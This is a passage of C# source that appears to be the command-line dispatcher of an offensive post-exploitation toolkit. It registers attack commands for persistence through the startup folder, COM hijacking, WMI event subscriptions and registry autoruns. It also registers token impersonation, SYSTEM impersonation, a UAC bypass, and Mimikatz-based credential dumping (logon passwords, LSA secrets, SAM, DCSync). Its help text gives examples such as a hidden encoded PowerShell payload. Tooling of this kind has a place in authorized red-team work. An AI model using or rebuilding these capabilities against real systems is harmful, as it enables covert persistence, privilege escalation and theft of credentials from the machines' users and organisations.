            var PersistStartup_Command = new Command("PersistStartup", "Installs a payload into the current users startup folder.\n" +
                "Payload: Payload to write to a file.E.g. \"powershell -Sta -Nop -Window Hidden -EncodedCommand <blah>\".\n" +
                "FileName: Name of the file to write. E.g. \"startup.bat\".\n");

            var PersistStartup_Payload_Option = new Option<String>(
                name: "/Payload",
                description: "Payload to write to a file.");

            PersistStartup_Command.AddOption(PersistStartup_Payload_Option);

            var PersistStartup_FileName_Option = new Option<String>(
                name: "/FileName",
                description: "Name of the file to write.");

            PersistStartup_Command.AddOption(PersistStartup_FileName_Option);

            rootCommand.AddCommand(PersistStartup_Command);

            PersistStartup_Command.SetHandler((Payload, FileName) =>
            {
                String PersistStartup_Command_result = PersistStartup.Execute(Payload, FileName);
                getResult(PersistStartup_Command_result);
            });

            // PersistCOMHijack
            var PersistCOMHijack_Command = new Command("PersistCOMHijack", "Hijacks a CLSID key to execute a payload for persistence.");

            var PersistCOMHijack_CLSID_Option = new Option<String>(
                name: "/CLSID",
                description: "Missing CLSID to abuse.");

            PersistCOMHijack_Command.AddOption(PersistCOMHijack_CLSID_Option);

            var PersistCOMHijack_ExecutablePath_Option = new Option<String>(
                name: "/ExecutablePath",
                description: "Path to the executable path.");

            PersistCOMHijack_Command.AddOption(PersistCOMHijack_ExecutablePath_Option);

            rootCommand.AddCommand(PersistCOMHijack_Command);

            PersistCOMHijack_Command.SetHandler((CLSID, ExecutablePath) =>
            {
                String PersistCOMHijack_Command_result = PersistCOMHijack.Execute(CLSID, ExecutablePath);
                getResult(PersistCOMHijack_Command_result);
            });

            // PersistWMI
            var PersistWMI_Command = new Command("PersistWMI", "Creates a WMI Event, Consumer and Binding to execute a payload.");

            var PersistWMI_EventName_Option = new Option<String>(
            name: "/EventName",
            description: "Creates a WMI Event, Consumer and Binding to execute a payload.\n" +
            "EventName: An arbitrary name to be assigned to the new WMI Event.E.g. \"Evil Persistence\".\n" +
            "EventFilter: Specifies the event trigger to use.The options are \"ProcessStart\".\n" +
            "EventConsumer: Specifies the action to carry out. The options are \"CommandLine\" (OS Command) and \"ActiveScript\" (JScript or VBScript).\n" +
            "Payload: Specifies the CommandLine or ActiveScript payload to run.E.g. \"powershell -Sta -Nop -Window Hidden -EncodedCommand <blah>\".\n" +
            "ProcessName: Specifies the process name when the \"ProcessStart\" trigger is selected.E.g. \"notepad.exe\".\n" +
            "ScriptingEngine: Specifies the scripting engine when the \"ActiveScript\" consumer is selected.The options are \"JScript\" and \"VBScript\"\n.");

            PersistWMI_Command.AddOption(PersistWMI_EventName_Option);

            var PersistWMI_EventFilter_Option = new Option<String>(
                name: "/EventFilter",
                description: "Specifies the event trigger to use.");

            PersistWMI_Command.AddOption(PersistWMI_EventFilter_Option);

            var PersistWMI_EventConsumer_Option = new Option<String>(
                name: "/EventConsumer",
                description: "Specifies the action to carry out.");

            PersistWMI_Command.AddOption(PersistWMI_EventConsumer_Option);

            var PersistWMI_Payload_Option = new Option<String>(
                name: "/Payload",
                description: "Specifies the CommandLine or ActiveScript payload to run.");

            PersistWMI_Command.AddOption(PersistWMI_Payload_Option);

            var PersistWMI_ProcessName_Option = new Option<String>(
                name: "/ProcessName",
                description: "Specifies the process name when the ProcessStart trigger is selected.");

            PersistWMI_Command.AddOption(PersistWMI_ProcessName_Option);

            var PersistWMI_ScriptingEngine_Option = new Option<String>(
                name: "/ScriptingEngine",
                description: "Specifies the scripting engine when the ActiveScript consumer is selected.",
                defaultValue: "");

            PersistWMI_Command.AddOption(PersistWMI_ScriptingEngine_Option);

            rootCommand.AddCommand(PersistWMI_Command);

            PersistWMI_Command.SetHandler((EventName, EventFilter, EventConsumer, Payload, ProcessName, ScriptingEngine) =>
            {
                String PersistWMI_Command_result = PersistWMI.Execute(EventName, EventFilter, EventConsumer, Payload, ProcessName, ScriptingEngine);
                getResult(PersistWMI_Command_result);
            });

            // PersistAutorun
            var PersistAutorun_Command = new Command("PersistAutorun", "Installs an autorun value in HKCU or HKLM to execute a payload.\n" +
                "TargetHive: Target hive to install autorun.Specify \"CurrentUser\" for HKCU and \"LocalMachine\" for HKLM.\n" +
                "Value: Value to set in the registry.E.g. \"C:\\Example\\GruntStager.exe\"\n" +
                "Name: Name for the registy value.E.g. \"Updater\".\n");

            var PersistAutorun_TargetHive_Option = new Option<String>(
                name: "/TargetHive",
                description: "Target hive to install autorun.");

            PersistAutorun_Command.AddOption(PersistAutorun_TargetHive_Option);

            var PersistAutorun_Name_Option = new Option<String>(
                name: "/Name",
                description: "Name for the registy value.");

            PersistAutorun_Command.AddOption(PersistAutorun_Name_Option);

            var PersistAutorun_Value_Option = new Option<String>(
                name: "/Value",
                description: "Value to set in the registry.");

            PersistAutorun_Command.AddOption(PersistAutorun_Value_Option);

            rootCommand.AddCommand(PersistAutorun_Command);

            PersistAutorun_Command.SetHandler((TargetHive, Name, Value) =>
            {
                String PersistAutorun_Command_result = PersistAutorun.Execute(TargetHive, Name, Value);
                getResult(PersistAutorun_Command_result);
            });

            // MakeToken
            var MakeToken_Command = new Command("MakeToken", "Makes a new token with a specified username and password, and impersonates it to conduct future actions as the specified user.");

            var MakeToken_Username_Option = new Option<String>(
                name: "/Username",
                description: "Username to authenticate as.");

            MakeToken_Command.AddOption(MakeToken_Username_Option);

            var MakeToken_Domain_Option = new Option<String>(
                name: "/Domain",
                description: "Domain to authenticate the user to.");

            MakeToken_Command.AddOption(MakeToken_Domain_Option);

            var MakeToken_Password_Option = new Option<String>(
                name: "/Password",
                description: "Password to authenticate the user.");

            MakeToken_Command.AddOption(MakeToken_Password_Option);

            var MakeToken_LogonType_Option = new Option<String>(
                name: "/LogonType",
                description: "LogonType to use. Defaults to LOGON32_LOGON_NEW_CREDENTIALS, which is suitable to perform actions that require remote authentication. LOGON32_LOGON_INTERACTIVE is suitable for local actions.",
                defaultValue: "");

            MakeToken_Command.AddOption(MakeToken_LogonType_Option);

            rootCommand.AddCommand(MakeToken_Command);

            MakeToken_Command.SetHandler((Username, Domain, Password, LogonType) =>
            {
                String MakeToken_Command_result = MakeToken.Execute(Username, Domain, Password, LogonType);
                getResult(MakeToken_Command_result);
            });

            var GetSystem_Command = new Command("GetSystem", "Impersonate the SYSTEM user. Equates to ImpersonateUser(\"NT AUTHORITY\\SYSTEM\").");

            rootCommand.AddCommand(GetSystem_Command);

            GetSystem_Command.SetHandler(() =>
            {
                String GetSystem_Command_result = GetSystem.Execute();
                getResult(GetSystem_Command_result);
            });

            // ImpersonateProcess
            var ImpersonateProcess_Command = new Command("ImpersonateProcess", "Impersonate the token of the specified process. Used to execute subsequent commands as the user associated with the token of the specified process.");

            var ImpersonateProcess_ProcessID_Option = new Option<String>(
                name: "/ProcessID",
                description: "Process ID of the process to impersonate.");

            ImpersonateProcess_Command.AddOption(ImpersonateProcess_ProcessID_Option);

            rootCommand.AddCommand(ImpersonateProcess_Command);

            ImpersonateProcess_Command.SetHandler((ProcessID) =>
            {
                String ImpersonateProcess_Command_result = ImpersonateProcess.Execute(ProcessID);
                getResult(ImpersonateProcess_Command_result);
            });

            // ImpersonateUser_Command
            var ImpersonateUser_Command = new Command("ImpersonateUser", "Find a process owned by the specified user and impersonate the token. Used to execute subsequent commands as the specified user.");

            var ImpersonateUser_Username_Option = new Option<String>(
                name: "/Username",
                description: "User to impersonate. \"DOMAIN\\Username\" format expected.");

            ImpersonateUser_Command.AddOption(ImpersonateUser_Username_Option);

            rootCommand.AddCommand(ImpersonateUser_Command);

            ImpersonateUser_Command.SetHandler((Username) =>
            {
                String ImpersonateUser_Command_result = ImpersonateUser.Execute(Username);
                getResult(ImpersonateUser_Command_result);
            });

            // BypassUACCommand
            var BypassUACCommand_Command = new Command("BypassUACCommand", "Bypasses UAC through token duplication and executes a command with high integrity.");

            var BypassUACCommand_Command_Option = new Option<String>(
                name: "/Command",
                description: "Command to execute with high integrity.");

            BypassUACCommand_Command.AddOption(BypassUACCommand_Command_Option);

            var BypassUACCommand_Parameters_Option = new Option<String>(
                name: "/Parameters",
                description: "Command line parameters to pass to the Command.",
                defaultValue: "");

            BypassUACCommand_Command.AddOption(BypassUACCommand_Parameters_Option);

            var BypassUACCommand_Directory_Option = new Option<String>(
                name: "/Directory",
                description: "Directory containing the Command executable.",
                defaultValue: "");

            BypassUACCommand_Command.AddOption(BypassUACCommand_Directory_Option);
            var BypassUACCommand_ProcessID_Option = new Option<String>(
            name: "/ProcessID",
            description: "ProcessID.",
            defaultValue: "");

            BypassUACCommand_Command.AddOption(BypassUACCommand_ProcessID_Option);

            rootCommand.AddCommand(BypassUACCommand_Command);

            BypassUACCommand_Command.SetHandler((Command, Parameters, Directory, ProcessID) =>
            {
                String BypassUACCommand_Command_result = BypassUACCommand.Execute(Command, Parameters, Directory, ProcessID);
                getResult(BypassUACCommand_Command_result);
            });

            // RevertToSelf
            var RevertToSelf_Command = new Command("RevertToSelf", "Ends the impersonation of any token, reverting back to the initial token associated with the current process.\nUseful in conjuction with functions impersonate a token and do not automatically RevertToSelf,\nsuch as ImpersonateUser(), ImpersonateProcess(), GetSystem(), and MakeToken().");

            RevertToSelf_Command.AddAlias("RevToSelf");

            rootCommand.AddCommand(RevertToSelf_Command);

            RevertToSelf_Command.SetHandler(() =>
            {
                String RevertToSelf_Command_result = RevertToSelf.Execute();
                getResult(RevertToSelf_Command_result);
            });

            // LogonPasswords
            var LogonPasswords_Command = new Command("LogonPasswords", "Execute the 'privilege::debug sekurlsa::logonPasswords' Mimikatz command.");

            rootCommand.AddCommand(LogonPasswords_Command);

            LogonPasswords_Command.SetHandler(() =>
            {
                String LogonPasswords_Command_result = LogonPasswords.Execute();
                getResult(LogonPasswords_Command_result);
            });

            // LsaSecrets
            var LsaSecrets_Command = new Command("LsaSecrets", "Execute the 'privilege::debug lsadump::secrets' Mimikatz command.");

            rootCommand.AddCommand(LsaSecrets_Command);

            LsaSecrets_Command.SetHandler(() =>
            {
                String LsaSecrets_Command_result = LsaSecrets.Execute();
                getResult(LsaSecrets_Command_result);
            });

            // LsaCache
            var LsaCache_Command = new Command("LsaCache", "Execute the 'privilege::debug lsadump::cache' Mimikatz command.");

            rootCommand.AddCommand(LsaCache_Command);

            LsaCache_Command.SetHandler(() =>
            {
                String LsaCache_Command_result = LsaCache.Execute();
                getResult(LsaCache_Command_result);
            });

            // SamDump
            var SamDump_Command = new Command("SamDump", "Execute the 'privilege::debug lsadump::sam' Mimikatz command.");

            rootCommand.AddCommand(SamDump_Command);

            SamDump_Command.SetHandler(() =>
            {
                String SamDump_Command_result = SamDump.Execute();
                getResult(SamDump_Command_result);
            });

            // Wdigest
            var Wdigest_Command = new Command("Wdigest", "Execute the 'sekurlsa::wdigest' Mimikatz command.");

            rootCommand.AddCommand(Wdigest_Command);

            Wdigest_Command.SetHandler(() =>
            {
                String Wdigest_Command_result = Wdigest.Execute();
                getResult(Wdigest_Command_result);
            });

            // DCSync
            var DCSync_Command = new Command("DCSync", "Execute the 'lsadump::dcsync Mimikatz command.");

            var DCSync_Username_Option = new Option<String>(
                name: "/Username",
                description: "");

            DCSync_Command.AddOption(DCSync_Username_Option);

            var DCSync_FQDN_Option = new Option<String>(
                name: "/FQDN",
                description: "",
                defaultValue: "");

            DCSync_Command.AddOption(DCSync_FQDN_Option);

            var DCSync_DC_Option = new Option<String>(
                name: "/DC",
                description: "",
                defaultValue: "");

            DCSync_Command.AddOption(DCSync_DC_Option);

            rootCommand.AddCommand(DCSync_Command);

            DCSync_Command.SetHandler((Username, FQDN, DC) =>
            {
                String DCSync_Command_result = DCSync.Execute(Username, FQDN, DC);
                getResult(DCSync_Command_result);
            });

            // Mimikatz
            var Mimikatz_Command = new Command("Mimikatz", "Execute a mimikatz command.");

            var Mimikatz_Command_Option = new Option<String>(
                name: "/Command",
                description: "Mimikatz command to execute.");

            Mimikatz_Command.AddOption(Mimikatz_Command_Option);

            rootCommand.AddCommand(Mimikatz_Command);

            Mimikatz_Command.SetHandler((Command) =>
            {
                String Mimikatz_Command_result = Mimikatz.Execute(Command);
                getResult(Mimikatz_Command_result);
            });

            // SafetyKatz
            var SafetyKatz_Command = new Command("SafetyKatz", "Use SafetyKatz.");

            rootCommand.AddCommand(SafetyKatz_Command);

            SafetyKatz_Command.SetHandler(() =>
            {
                String SafetyKatz_Command_result = SafetyKatz.Execute();
                getResult(SafetyKatz_Command_result);
            });



            rootCommand.Invoke(args);

        }

        static System.Reflection.Assembly CurrentDomain_AssemblyResolve(object sender, ResolveEventArgs args)
        {
            return EmbeddedAssembly.Get(args.Name);
        }
    }
}
